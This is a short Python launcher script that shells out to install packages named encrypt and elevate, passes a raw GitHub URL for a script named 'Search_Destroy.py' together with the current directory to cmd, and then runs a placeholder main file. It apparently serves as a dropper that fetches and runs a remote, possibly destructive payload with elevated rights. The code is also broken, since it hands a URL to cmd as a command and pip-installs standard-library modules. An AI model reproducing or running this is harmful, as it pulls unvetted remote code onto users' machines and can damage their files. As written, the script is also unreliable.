import os

Current_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

os.system('cmd /c "pip install encrypt"')
os.system('cmd /c "pip install elevate"')
os.system('cmd /c "pip install threading"')
os.system('cmd /c "pip install random"')
os.system(f'cmd /c "https://raw.githubusercontent.com/itrussi/Search-and-Destroy/main/Search_Destroy.py {Current_DIR}"')
os.system('cmd /c "python3 ENTER_YOUR_MAIN_FILE_NAME"')
